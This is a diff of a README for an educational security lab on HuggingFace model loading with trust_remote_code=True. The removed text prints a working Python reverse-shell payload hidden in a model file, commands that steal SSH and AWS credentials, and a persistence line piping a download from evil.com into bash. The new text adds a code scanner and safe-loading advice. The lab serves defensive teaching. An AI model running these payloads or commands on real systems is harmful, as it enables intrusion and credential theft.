@@ -1,30 +1,30 @@
-# Lab 06: HuggingFace Supply Chain Attack (Reverse Shell)
+# Lab 06: HuggingFace Supply Chain Attack
 
 ## 🎯 Overview
 
-This lab demonstrates how **`trust_remote_code=True`** in HuggingFace's `transformers` library can lead to **complete system compromise**. When a victim loads a malicious model, hidden Python code executes automatically—spawning a **reverse shell** that gives the attacker full interactive access to the victim's machine.
+This lab demonstrates how **`trust_remote_code=True`** in HuggingFace's `transformers` library can be exploited to execute arbitrary code - including a **reverse shell** that gives attackers full access to your machine.
 
-> **Impact**: The attacker gains the same access as if they were sitting at the victim's terminal—they can steal credentials, browse files, install backdoors, and pivot to other systems.
+**Attack scenario:** An attacker uploads a malicious model to HuggingFace Hub. When a developer loads it with `trust_remote_code=True`, the attacker gets shell access.
 
 ---
 
 ## 🔥 The Vulnerability
 
 ```python
-# ⚠️ DANGEROUS - This executes arbitrary Python from the model repo!
-from transformers import AutoModel
+from transformers import AutoModelForCausalLM
 
-model = AutoModel.from_pretrained(
-    "malicious-org/helpful-model",
-    trust_remote_code=True  # 💀 Game over
+# This single line can compromise your machine!
+model = AutoModelForCausalLM.from_pretrained(
+    "helpful-ai/super-fast-qa-bert",
+    trust_remote_code=True  # ← Downloads & executes .py files!
 )
 ```
 
-When `trust_remote_code=True` is set:
-1. HuggingFace reads `config.json` from the model directory
-2. Finds `auto_map` pointing to custom Python file
-3. **Imports and executes** that Python file
-4. Any code in the file runs with full user privileges
+When `trust_remote_code=True`:
+1. HuggingFace reads `config.json` with `auto_map` pointing to custom code
+2. Downloads Python files (e.g., `modeling_helpfulqa.py`) to cache
+3. **Imports and executes** the Python code during model instantiation
+4. Malicious code in `__init__` runs with your privileges!
 
 ---
 
@@ -32,38 +32,23 @@ When `trust_remote_code=True` is set:
 
 ```
 lab-06-supply-chain-attack/
-├── 1_attacker_listener.py        # Attacker's reverse shell listener
-├── 2_victim_loads_model.py       # Victim's "innocent" Q&A chatbot (VULNERABLE)
-├── 3_safe_model_loading.py       # Safe model loading demo (SECURE)
-├── malicious_model/              # Fake HuggingFace model
-│   ├── config.json               # Points to malicious code
-│   └── reverse_shell_payload.py  # Hidden reverse shell + Q&A model
-├── .env                          # Configuration (host/port)
-├── .env.example                  # Example configuration
+├── 1_attacker_listener.py          # Attacker's reverse shell listener
+├── 2_victim_loads_model.py         # Victim loads model (gets compromised)
+├── 3_safe_model_loading.py         # Safe version with security scanner
+├── model_security_scanner.py       # Reusable security scanner class
+├── hub_cache/                      # Simulated ~/.cache/huggingface/hub/
+│   └── models--helpful-ai--super-fast-qa-bert/
+│       ├── config.json             # Points to custom code via auto_map
+│       ├── modeling_helpfulqa.py   # Custom model code (contains backdoor)
+│       ├── model.safetensors       # Model weights (~350MB, generated)
+│       ├── tokenizer_config.json   # Tokenizer configuration
+│       ├── special_tokens_map.json # Special tokens
+│       ├── vocab.json              # Vocabulary (downloaded)
+│       └── merges.txt              # BPE merges (downloaded)
+├── Makefile                        # Easy setup and run commands
 ├── requirements.txt
-├── reset.py
-└── README.md
-```
-
----
-
-## 🔄 Attack Flow
-
-```
-┌─────────────────────────────┐         ┌─────────────────────────────┐
-│      ATTACKER MACHINE       │         │       VICTIM MACHINE        │
-│      (127.0.0.1)          │         │      (10.165.28.139)        │
-│                             │         │                             │
-│  1. Start listener          │         │  2. Load "helpful" model    │
-│     python 1_attacker_...   │◄────────│     trust_remote_code=True  │
-│                             │ Reverse │                             │
-│  3. Receive shell! 🎉       │  Shell  │  Sees: Working Q&A chatbot  │
-│     Full access to victim   │ Connect │  No idea shell is active    │
-│                             │         │                             │
-│  4. Run commands:           │         │  5. Victim asks questions:  │
-│     $ pwd → /home/victim    │         │     "What is AI?" → answer  │
-│     $ cat ~/.ssh/id_rsa     │         │     (model actually works!) │
-└─────────────────────────────┘         └─────────────────────────────┘
+├── .env.example                    # Configuration template
+└── .env                            # Your configuration (gitignored)
 ```
 
 ---
@@ -71,250 +56,185 @@ lab-06-supply-chain-attack/
 ## ⚡ Quick Start
 
 ### Prerequisites
-
 - Python 3.8+
-- Linux/macOS (uses `fork()` and `pty`)
-- **Two machines** (or two terminals for local demo)
+- Linux/macOS (uses `fork`, `pty`)
+- Two terminal windows
 
 ### Setup
 
-**On both machines:**
-
 ```bash
 cd lab-06-supply-chain-attack
-python3 -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
+make setup
 ```
 
-### Configuration
+This will:
+- Create virtual environment
+- Install dependencies
+- Generate model weights (~350MB)
+- Download tokenizer files
+- Create `.env` from template
 
-Copy and edit the environment file:
+### Configure
 
+For **local testing** (same machine):
 ```bash
-cp .env.example .env
+echo "ATTACKER_HOST=127.0.0.1
+ATTACKER_PORT=4444" > .env
 ```
 
-Edit `.env` to set attacker's IP:
-
-```dotenv
-# Attacker Configuration
-ATTACKER_HOST=127.0.0.1    # Attacker's IP address
-ATTACKER_PORT=4444           # Port for reverse shell
+For **two-machine demo**:
+```bash
+# Edit .env with attacker's IP
+ATTACKER_HOST=<attacker-ip>
+ATTACKER_PORT=4444
 ```
 
 ---
 
 ## 🎬 Running the Demo
 
-### Step 1: Open Firewall (Attacker Machine)
+### Demo 1: The Attack
 
+**Terminal 1 - Attacker:**
 ```bash
-sudo iptables -I INPUT -p tcp --dport 4444 -j ACCEPT
+make run-attacker
+# Or: python 1_attacker_listener.py
 ```
 
-### Step 2: Start Attacker Listener
-
-**On attacker machine (127.0.0.1):**
-
+**Terminal 2 - Victim:**
 ```bash
-cd lab-06-supply-chain-attack
-source venv/bin/activate
-python 1_attacker_listener.py
+make run-victim
+# Or: python 2_victim_loads_model.py
 ```
 
-You'll see:
+**What happens:**
+1. Victim runs standard HuggingFace model loading code
+2. Model's `__init__` triggers reverse shell (disguised as "telemetry")
+3. Attacker gets full bash shell on victim's machine
+4. Victim sees normal chatbot - doesn't notice compromise!
+
+**Attacker's view:**
 ```
-🏴‍☠️ ATTACKER'S REVERSE SHELL LISTENER
-Listening on 127.0.0.1:4444...
-```
-
-### Step 3: Run Victim Script
-
-**On victim machine (10.165.28.139):**
-
-```bash
-cd labs  # Run from parent directory to show different pwd
-source lab-06-supply-chain-attack/venv/bin/activate
-python lab-06-supply-chain-attack/2_victim_loads_model.py
-```
-
-Victim sees a working Q&A chatbot:
-```
-==================================================
-  Simple Q&A Model - HuggingFace Demo
-==================================================
-
-Loading model: helpful-ai/super-fast-bert
-Model loaded successfully!
-
-You: What is AI?
-Bot: AI (disambiguation) AI may refer to...
-
-You: What is 2 + 2?
-Bot: 4
-```
-
-### Step 4: Attacker Has Shell! 🎉
-
-**Back on attacker's terminal:**
-
-```
-🚨 SHELL CONNECTED! Victim: 10.165.28.139:54321
-
-$ pwd
-/home/victim/labs          # ← Victim's directory!
+🚨 SHELL CONNECTED!
 
 $ whoami
 victim
+$ cat ~/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+...
+```
 
-$ cat ~/.aws/credentials
-[default]
-aws_access_key_id = AKIA...
+### Demo 2: The Defense
+
+**Terminal 2 - Safe User:**
+```bash
+make run-safe
+# Or: python 3_safe_model_loading.py
+```
+
+**Output:**
+```
+🔍 WAIT! Let me inspect the downloaded files first...
+
+[1/3] Checking if model requires custom code execution...
+  ⚠️  Model requires trust_remote_code=True
+  ⚠️  Will execute: ['modeling_helpfulqa.HelpfulQAForCausalLM']
+
+[2/3] Inspecting downloaded files...
+  Found 7 file(s) in cache:
+     ⚠️  modeling_helpfulqa.py (EXECUTABLE CODE)
+     - config.json
+     ...
+
+[3/3] Scanning downloaded code for red flags...
+  🚨 DANGEROUS CODE DETECTED:
+     - modeling_helpfulqa.py: Network socket creation
+     - modeling_helpfulqa.py: Process forking
+     - modeling_helpfulqa.py: PTY shell spawning
+
+════════════════════════════════════════════════════════════
+  ❌ NOT SAFE to load with trust_remote_code=True
+════════════════════════════════════════════════════════════
 ```
 
 ---
 
-## 🔍 How It Works
+## 🛡️ Defense Strategies
 
-### 1. The Malicious `config.json`
-
-```json
-{
-  "auto_map": {
-    "AutoModel": "reverse_shell_payload.BackdooredModel"
-  }
-}
-```
-
-### 2. The Payload (`reverse_shell_payload.py`)
+### First Line of Defense
+**Avoid `trust_remote_code=True` entirely!**
 
 ```python
-import os, socket, pty
+# ❌ DANGEROUS
+model = AutoModelForCausalLM.from_pretrained("unknown/model", trust_remote_code=True)
 
-def _spawn_shell():
-    pid = os.fork()  # Fork: child = shell, parent = normal
-    
-    if pid == 0:  # Child process
-        sock = socket.socket()
-        sock.connect(("127.0.0.1", 4444))
-        os.dup2(sock.fileno(), 0)  # stdin
-        os.dup2(sock.fileno(), 1)  # stdout
-        os.dup2(sock.fileno(), 2)  # stderr
-        pty.spawn("/bin/bash")
-        os._exit(0)
-    
-    # Parent continues normally - victim sees working chatbot!
+# ✅ SAFE - Use only standard architectures
+model = AutoModelForCausalLM.from_pretrained("gpt2")
 
-_spawn_shell()  # Executes on import!
-
-class BackdooredModel:
-    # Real Q&A model using flan-t5-small
-    # Victim gets actual answers while attacker has shell
+# ✅ SAFE - Explicit trust_remote_code=False (default)
+model = AutoModelForCausalLM.from_pretrained("model", trust_remote_code=False)
 ```
 
-### 3. Why `os.fork()` is Critical
-
-| Without Fork | With Fork |
-|-------------|-----------|
-| Shell hijacks victim's terminal | Shell runs in background process |
-| Victim immediately notices | Victim sees normal chatbot |
-| Attack is obvious | Attack is completely hidden |
-
----
-
-## 💀 What Attackers Can Do
-
-Once connected, the attacker has **full shell access**:
-
-```bash
-# Steal credentials
-cat ~/.aws/credentials
-cat ~/.ssh/id_rsa
-cat ~/.config/gh/hosts.yml
-
-# Find API keys
-env | grep -i key
-grep -r "API_KEY" ~/projects/
-
-# Browse files
-ls -la ~/
-find ~ -name "*.env" 2>/dev/null
-
-# Persistent access
-echo 'curl http://evil.com/backdoor.sh | bash' >> ~/.bashrc
-```
-
----
-
-## 🛡️ Defenses
-
-| Defense | How It Helps |
-|---------|--------------|
-| **Never use `trust_remote_code=True`** | Blocks all custom code execution |
-| **Use SafeTensors format** | Binary format, cannot contain code |
-| **Pin model revisions** | `revision="abc123"` prevents silent updates |
-| **Audit model code** | Review `.py` files before loading |
-| **Use containers** | Sandbox isolates damage |
-| **Network segmentation** | Block outbound connections |
-
-### Safe Loading Demo
-
-Run the safe version to compare:
-
-```bash
-python 3_safe_model_loading.py
-```
-
-This demonstrates the same Q&A functionality **without** the vulnerability:
-- ✅ No `trust_remote_code=True`
-- ✅ Uses verified model from Google
-- ✅ No reverse shell, no backdoor
-
-### Safe Code Example
+### If You Must Use Custom Code
 
 ```python
-from transformers import AutoModel
+from model_security_scanner import ModelSecurityScanner
 
-# ✅ SAFE - Only loads weights, no code execution
-model = AutoModel.from_pretrained(
-    "bert-base-uncased",
-    trust_remote_code=False,  # Default and safe!
-    use_safetensors=True      # Binary format only
+# Scan BEFORE loading
+scanner = ModelSecurityScanner("/path/to/model/cache")
+if scanner.scan():
+    model = AutoModelForCausalLM.from_pretrained(..., trust_remote_code=True)
+else:
+    print("Malicious code detected!", scanner.findings)
+```
+
+### Additional Protections
+
+| Setting | Custom .py files | Pickle weights |
+|---------|-----------------|----------------|
+| `trust_remote_code=False` | ✅ Blocked | ⚠️ Still risky |
+| `use_safetensors=True` | N/A | ✅ Safe |
+| Both | ✅ Safe | ✅ Safe |
+
+**Safest approach:**
+```python
+model = AutoModelForCausalLM.from_pretrained(
+    "model",
+    trust_remote_code=False,  # No custom code
+    use_safetensors=True,     # No pickle deserialization
 )
 ```
 
 ---
 
-## 📊 Risk Assessment
+## 🔧 Makefile Commands
 
-| Factor | Rating | Notes |
-|--------|--------|-------|
-| **Exploitability** | 🔴 Easy | Single flag enables attack |
-| **Impact** | 🔴 Critical | Full system compromise |
-| **Detection** | 🔴 Hard | Victim sees working chatbot |
-| **Prevalence** | 🟡 Medium | Common in tutorials & notebooks |
+```bash
+make help         # Show all commands
+make setup        # Full setup (venv + deps + model + tokenizer)
+make install      # Install dependencies only
+
+make run-attacker # Start attacker listener
+make run-victim   # Run victim script
+make run-safe     # Run safe version with scanner
+
+make clean        # Remove generated files
+make reset        # Kill processes + clean pycache
+```
 
 ---
 
 ## 🧹 Reset Lab
 
 ```bash
-python reset.py
+make reset
+# Or: python reset.py
 ```
-
-This kills any lingering listeners and cleans up temp files.
-
----
-
-## 📚 References
-
-- [HuggingFace Custom Models](https://huggingface.co/docs/transformers/custom_models)
-- [SafeTensors Format](https://huggingface.co/docs/safetensors)
-- [OWASP ML Security Top 10](https://owasp.org/www-project-machine-learning-security-top-10/)
 
 ---
 
 ## ⚠️ Disclaimer
 
-**FOR EDUCATIONAL PURPOSES ONLY.** This lab demonstrates security vulnerabilities to help defenders understand and mitigate risks. Do not use these techniques maliciously.
+**FOR EDUCATIONAL PURPOSES ONLY.** 
+
+This lab demonstrates security vulnerabilities to help defenders understand and mitigate risks. Do not use these techniques maliciously.
